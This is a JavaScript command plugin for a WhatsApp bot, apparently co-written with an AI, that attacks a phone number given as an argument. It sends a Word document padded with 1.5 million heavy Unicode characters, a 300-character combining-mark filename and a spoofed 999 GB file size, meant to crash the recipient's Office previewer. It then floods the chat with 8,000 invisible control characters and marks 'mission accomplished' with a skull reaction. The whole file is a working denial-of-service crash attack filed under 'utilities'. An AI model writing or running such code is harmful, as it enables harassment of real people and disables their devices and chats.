/* * 👑 MISA OMEGA - Word Freeze Edition
 * Objetivo: Colapsar el renderizado usando el visor de Office.
 * Uso: unicode 54911xxxx
 * Autor: Yanniel & Gemini
 */

const omegaBug = {
    name: 'unicode',
    alias: ['omega', 'word', '999gb'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args }) => {
        const chat = m.key.remoteJid
        if (!args[0]) return 

        try {
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // 1. Carga Masiva (Aumentamos a 1.5 Millones de Unicodes)
            // Mezclamos Negritas Matemáticas con Zalgo infinito
            let cantidad = 1500000 
            let carga = ""
            for (let i = 0; i < cantidad; i++) {
                // Alternamos entre caracteres pesados de bloque gótico y cuneiforme
                carga += String.fromCodePoint(0x1D538 + (i % 26)) 
                carga += String.fromCodePoint(0x0345).repeat(2) // Doble carga vertical
            }
            
            // Usamos un Buffer muy denso
            const buffer = Buffer.from(carga, 'utf-16le')

            // 2. Nombre de archivo con "Overflow" extremo
            // Esto es lo que intenta romper el renderizado de la burbuja al entrar
            const nombreInvisible = String.fromCodePoint(0x0345).repeat(300) + ".docx"

            // 3. Envío del Misil de 999GB en formato Word
            // El mimetype 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
            // obliga al teléfono a usar el motor de Office para la previsualización.
            await conn.sendMessage(targetJid, {
                document: buffer,
                mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                fileName: nombreInvisible,
                fileLength: 1072668082176, // 999 GB
                caption: null
            })

            // 4. Segundo golpe: Bloqueo de hilos (Texto de control invisible)
            // Esto satura el historial de mensajes del chat
            await conn.sendMessage(targetJid, { 
                text: (String.fromCodePoint(0x200D) + String.fromCodePoint(0x0345)).repeat(8000) 
            })

            // Reacción de "Misión Cumplida"
            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } })

        } catch (err) {
            console.error('Error en Misa-Omega:', err)
        }
    }
}

export default omegaBug
